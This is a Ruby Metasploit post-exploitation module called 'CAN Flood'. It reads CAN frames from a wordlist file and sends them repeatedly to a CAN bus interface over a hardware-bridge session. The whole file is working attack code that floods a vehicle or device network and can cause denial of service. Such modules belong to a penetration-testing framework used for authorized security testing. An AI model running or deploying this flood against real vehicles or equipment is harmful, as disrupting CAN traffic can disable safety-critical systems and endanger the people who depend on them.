##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CAN Flood',
        'Description' => 'Module that floods a CAN interface',
        'License' => MSF_LICENSE,
        'Author' => ['Pietro Biondi'],
        'Platform' => ['hardware'],
        'SessionTypes' => ['hwbridge']
      )
    )
    register_options(
      [
        OptInt.new('ROUNDS', [false, 'Number of executed rounds', 200]),
        OptString.new('CANBUS', [false, 'CAN interface', nil]),
        OptString.new('FRAMELIST', [true, 'Path to FRAMELIST', ::File.join(Msf::Config.data_directory, 'wordlists', 'frameListCanBus.txt')])
      ]
    )
  end

  def run
    vprint_status("Reading frame list file: #{datastore['FRAMELIST']}")
    unless ::File.exist? datastore['FRAMELIST']
      print_error "Frame list file '#{datastore['FRAMELIST']}' does not exist"
      return
    end
    frames = File.readlines(datastore['FRAMELIST']).map { |line| line.strip.split('+') }
    print_status(' -- FLOODING -- ')
    datastore['ROUNDS'].times do
      frames.each_index { |i| client.automotive.cansend(datastore['CANBUS'], frames[i][0], frames[i][1]) }
    end
  end
end
